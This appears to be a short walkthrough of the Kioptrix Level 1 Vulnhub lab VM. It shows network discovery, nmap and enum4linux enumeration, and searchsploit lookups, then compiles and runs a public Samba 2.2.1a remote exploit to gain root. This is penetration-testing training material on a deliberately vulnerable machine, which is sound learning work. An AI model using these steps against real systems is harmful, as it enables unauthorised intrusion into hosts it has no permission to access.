Kioptrix level 1 is a basic Vulnhub VM for beginners. You can download it from [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

### Finding IP address
```sh
netdiscover -r 192.168.1.0/24
```

So the IP address is 192.168.1.104

### Port Scanning
```sh
nmap -sC -sV -oA nmap/quick 192.168.1.104
```
![nmap](https://i.imgur.com/QWh7QIN.png)

As you can see in the above image, ports 22, 80, 111, 139, 443 are open.

### Exploitation
Since port 80 is open, I opened the website(192.168.1.104:80) in my browser. I did not find anything of our interest.

Next interesting thing for me is, port 139(a samba service). Our nmap scan did not find the version of samba service. Lets enumerate more using samba scripts
```sh
nmap -p 139 --script=smb-vuln* 192.168.1.104
```
nmap with smb-vuln* scripts also did not find the version of samba service. Give up? No. Try Harder.

Let's try enum4linux
```sh
enum4linux -a 192.168.1.104
```
Nothing from enum4linux as well. Give up? No. Try Harder.

Let's see if Metasploit can find the version of samba service.

Great. Samba's version is 2.2.1a

Let's see if we can find any vulnerabilities for samba 2.2.1a in the exploit database.
```sh
searchsploit samba 2.2
```

There are so many exploits available and we are interested in the last exploit in the above image.

Let's copy the exploit and execute
```sh
cp /usr/share/exploitdb/exploits/multiple/remote/10.c samba.c
gcc samba.c -o sambal
chmod +x sambal
./sambal -b 0 192.168.1.104
```

We got the root. So we don't need post exploitation for this VM.

Note: Normally we get unprivileged shell. By using privilege escalation techniques we will get the root.
